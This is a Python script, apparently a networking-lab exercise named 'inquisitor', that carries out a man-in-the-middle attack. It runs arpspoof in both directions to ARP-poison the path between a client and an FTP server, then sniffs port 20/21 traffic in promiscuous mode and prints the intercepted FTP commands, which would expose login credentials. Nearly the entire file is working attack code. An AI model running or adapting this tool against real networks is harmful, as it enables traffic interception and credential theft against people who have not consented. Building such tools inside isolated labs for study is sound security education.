import os
import sys
import socket
import time
import subprocess
import threading
from pylibpcap.pcap import sniff

class machine:
    def __init__(self, IPv4, MacAdress):
        self.IPv4 = self._check_IPv4(IPv4)
        self.MacAdress = MacAdress

    def __str__(self):
        return f"{self.IPv4} : {self.MacAdress}"

    def _check_IPv4(self, IPv4):
        try:
            socket.inet_pton(socket.AF_INET, IPv4)
        except (AttributeError, socket.error):
            raise ValueError(f"Invalid IPv4 address: {IPv4}")
        return IPv4

class Inquisitor:
    def __init__(self, argv):
        if len(argv) != 5:
            print("Usage: python3 ./inquisitor.py <IP_client_or_gateway> <Mac_client_or_gateway> <IP_ftp_server> <Mac_ftp_server>")
            sys.exit(1)
        try:
            self.client_machine = machine(argv[1], argv[2])
            self.ftp_server = machine(argv[3], argv[4])
        except ValueError as e:
            print(f"Initialization Error: {e}")
            sys.exit(1)
        self.inquisitor_interface, self.inquisitor_ip, self.inquisitor_mac = self.get_own_network_details()
        print(f"Inquisitor initialized:")
        print(f"  Client (src for attack): {self.client_machine}")
        print(f"  FTP Server (target for attack): {self.ftp_server}")
        print(f"  Inquisitor (self): {self.inquisitor_ip} : {self.inquisitor_mac} on {self.inquisitor_interface}")
        print("\nNote: IP forwarding is expected to be enabled by docker-compose sysctls.")

    def get_own_network_details(self):
        try:
            output = subprocess.check_output(["ip", "a"]).decode('utf-8')
            interface = ""
            ip = ""
            mac = ""
            lines = output.split('\n')
            for i, line in enumerate(lines):
                if ' UP ' in line and 'LOOPBACK' not in line and 'docker0' not in line:
                    parts = line.strip().split(':')
                    if len(parts) > 1:
                        interface = parts[1].strip().split('@')[0]
                        if i + 1 < len(lines) and 'link/ether' in lines[i+1]:
                            mac = lines[i+1].split()[1]
                        for j in range(i + 1, min(i + 5, len(lines))):
                            if 'inet ' in lines[j]:
                                ip = lines[j].split()[1].split('/')[0]
                                break
                        if interface and ip and mac:
                            break
            if not (interface and ip and mac):
                raise ValueError("Could not determine Inquisitor's own network details. Check `ip a` output in container.")
            return interface, ip, mac
        except Exception as e:
            print(f"Error getting own network details: {e}")
            sys.exit(1)

    def arp_poison_thread_target(self):
        try:
            cmd_client = ['arpspoof', '-i', self.inquisitor_interface, '-t', self.client_machine.IPv4, self.ftp_server.IPv4]
            cmd_server = ['arpspoof', '-i', self.inquisitor_interface, '-t', self.ftp_server.IPv4, self.client_machine.IPv4]
            print(f"Starting arpspoof for client: {' '.join(cmd_client)}")
            self.arpspoof_process_client = subprocess.Popen(cmd_client, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print(f"Starting arpspoof for server: {' '.join(cmd_server)}")
            self.arpspoof_process_server = subprocess.Popen(cmd_server, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print("ARP poisoning started with arpspoof. Press Ctrl+C to stop.")
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
        except Exception as e:
            print(f"Error in ARP poisoning thread: {e}")
        finally:
            print("ARP poisoning thread stopping...")

    def restore_arp(self):
        print("Restoring ARP tables...")
        if hasattr(self, 'arpspoof_process_client') and self.arpspoof_process_client.poll() is None:
            self.arpspoof_process_client.terminate()
            self.arpspoof_process_client.wait()
            print("Stopped arpspoof client process.")
        if hasattr(self, 'arpspoof_process_server') and self.arpspoof_process_server.poll() is None:
            self.arpspoof_process_server.terminate()
            self.arpspoof_process_server.wait()
            print("Stopped arpspoof server process.")
        try:
            print("Sending restore packets...")
            os.system(f"arpspoof -r -i {self.inquisitor_interface} -t {self.client_machine.IPv4} {self.ftp_server.IPv4}")
            os.system(f"arpspoof -r -i {self.inquisitor_interface} -t {self.ftp_server.IPv4} {self.client_machine.IPv4}")
            time.sleep(1)
            print("ARP tables restoration initiated.")
        except Exception as e:
            print(f"Error during ARP restoration: {e}. Check if arpspoof -r is available and accessible.")

    def packet_callback(self, plen, ts, buf):
        try:
            eth_header = buf[0:14]
            eth_type = (eth_header[12] << 8) + eth_header[13]
            if eth_type == 0x0800:
                ip_ihl = (buf[14] & 0x0F) * 4
                ip_protocol = buf[14 + 9]
                ip_src_bytes = buf[14 + 12 : 14 + 16]
                ip_dst_bytes = buf[14 + 16 : 14 + 20]
                ip_src = socket.inet_ntoa(ip_src_bytes)
                ip_dst = socket.inet_ntoa(ip_dst_bytes)
                if ip_protocol == 6:
                    tcp_header_start = 14 + ip_ihl
                    tcp_data_offset = ((buf[tcp_header_start + 12] & 0xF0) >> 4) * 4
                    tcp_sport = (buf[tcp_header_start] << 8) + buf[tcp_header_start + 1]
                    tcp_dport = (buf[tcp_header_start + 2] << 8) + buf[tcp_header_start + 3]
                    payload_start = tcp_header_start + tcp_data_offset
                    if len(buf) > payload_start:
                        payload_bytes = buf[payload_start:]
                        payload = payload_bytes.decode(errors='ignore').strip()
                        if tcp_sport == 21 or tcp_dport == 21:
                            print(f"[FTP COMMAND] {ip_src}:{tcp_sport} <-> {ip_dst}:{tcp_dport} : {payload}")
                        elif tcp_sport == 20 or tcp_dport == 20:
                            print(f"[FTP DATA] {ip_src}:{tcp_sport} <-> {ip_dst}:{tcp_dport} : (Payload length: {len(payload_bytes)} bytes)")
        except Exception as e:
            pass

    def start_sniffing(self):
        print("Starting packet sniffing for FTP traffic with pylibpcap...")
        try:
            sniff(self.inquisitor_interface, filters="tcp port 21 or tcp port 20", prn=self.packet_callback, count=-1, promisc=1)
        except Exception as e:
            print(f"Error starting sniffing: {e}")
            print("Common reasons: Incorrect interface name, insufficient permissions (NET_RAW capability), or libpcap issues.")
            sys.exit(1)

    def run(self):
        arp_thread = threading.Thread(target=self.arp_poison_thread_target)
        arp_thread.daemon = True
        arp_thread.start()
        try:
            self.start_sniffing()
        except KeyboardInterrupt:
            print("\nSniffing stopped by user.")
        finally:
            print("Cleaning up resources...")
            self.restore_arp()
            sys.exit(0)

if __name__ == "__main__":
    inquisitor_instance = Inquisitor(sys.argv)
    inquisitor_instance.run()
